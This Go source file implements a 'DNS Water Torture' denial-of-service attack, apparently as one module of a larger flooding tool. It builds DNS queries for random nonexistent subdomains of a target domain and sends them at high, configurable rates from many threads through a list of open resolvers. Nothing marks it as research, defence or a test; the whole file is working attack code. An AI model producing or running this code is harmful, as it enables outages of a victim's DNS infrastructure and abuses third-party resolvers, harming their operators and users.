package main

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"time"
	"context"
	"runtime"
)

// buildDNSNXOptimized constructs a random subdomain query: [8-char-hex].targetDomain
// It uses a pre-allocated buffer and avoids all fmt/append calls.
func buildDNSNXOptimized(targetLabels [][]byte, localRand *rand.Rand, buf []byte) []byte {
	// DNS Header (12 bytes)
	binary.BigEndian.PutUint16(buf[0:], uint16(localRand.Intn(65535))) // ID
	buf[2] = 0x01 // Flags: RD=1
	buf[3] = 0x00
	binary.BigEndian.PutUint16(buf[4:], 1) // Questions=1
	binary.BigEndian.PutUint16(buf[6:], 0) // Answers=0
	binary.BigEndian.PutUint16(buf[8:], 0) // Authority=0
	binary.BigEndian.PutUint16(buf[10:], 0) // Additional=0

	// Question Section
	offset := 12
	
	// 1. Random Subdomain (8 hex chars = 4 bytes raw or 8 bytes encoded)
	// For 2026-era speed, we just write 8 random lowercase letters
	buf[offset] = 8 // length of label
	offset++
	for i := 0; i < 8; i++ {
		buf[offset] = byte('a' + localRand.Intn(26))
		offset++
	}

	// 2. Append Target Domain Labels
	for _, label := range targetLabels {
		buf[offset] = byte(len(label))
		offset++
		copy(buf[offset:], label)
		offset += len(label)
	}
	
	buf[offset] = 0x00 // Null terminator
	offset++
	
	// QType=A (1), QClass=IN (1)
	binary.BigEndian.PutUint16(buf[offset:], 1)
	binary.BigEndian.PutUint16(buf[offset+2:], 1)
	offset += 4
	
	return buf[:offset]
}

func startDnsWaterTorture(ctx context.Context, opts ContextOpts, targetDomain string, resolvers []ReflectorData, threads int, duration time.Duration, pps int) {
	fmt.Printf("[DNS-WT] Water Torture on %s | threads=%d | dur=%v | resolvers=%d | max_pps=%d\n",
		targetDomain, threads, duration, len(resolvers), pps)

	// Pre-parse target domain labels
	var targetLabels [][]byte
	curr := ""
	for _, c := range targetDomain {
		if c == '.' {
			if curr != "" {
				targetLabels = append(targetLabels, []byte(curr))
			}
			curr = ""
		} else {
			curr += string(c)
		}
	}
	if curr != "" {
		targetLabels = append(targetLabels, []byte(curr))
	}

	var parsedResolvers []*net.UDPAddr
	for _, r := range resolvers {
		cleanIP := r.Addr
		if h, _, err := net.SplitHostPort(r.Addr); err == nil {
			cleanIP = h
		}
		if ip := net.ParseIP(cleanIP); ip != nil {
			parsedResolvers = append(parsedResolvers, &net.UDPAddr{IP: ip, Port: 53})
		}
	}

	if len(parsedResolvers) == 0 {
		fmt.Println("[DNS-WT] No valid resolvers found")
		return
	}

	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in DNS-WT: %v", r) } }()
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()
			
			src := rand.NewSource(time.Now().UnixNano() + int64(threadID))
			localRand := rand.New(src)

			// Single socket per thread (ListenUDP + WriteTo)
			conn, err := net.ListenUDP("udp", nil)
			if err != nil {
				return
			}
			defer conn.Close()

			dnsBuf := make([]byte, 512)

			for {
				// High-performance batching
				batchSize := 64
				if pps > 0 {
					if pps < 1000 {
						batchSize = 1
					} else if pps < 10000 {
						batchSize = 8
					}
					sleep := time.Second / time.Duration((pps/threads)/batchSize+1)
					time.Sleep(sleep)
				}

				select {
				case <-ctx.Done():
					return
				default:
					for b := 0; b < batchSize; b++ {
						packet := buildDNSNXOptimized(targetLabels, localRand, dnsBuf)
						resolver := parsedResolvers[localRand.Intn(len(parsedResolvers))]
						
						conn.WriteTo(packet, resolver)
						AddStats(1, int64(len(packet)))
					}
				}
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()
	fmt.Println("[DNS-WT] DNS Water Torture finished")
}
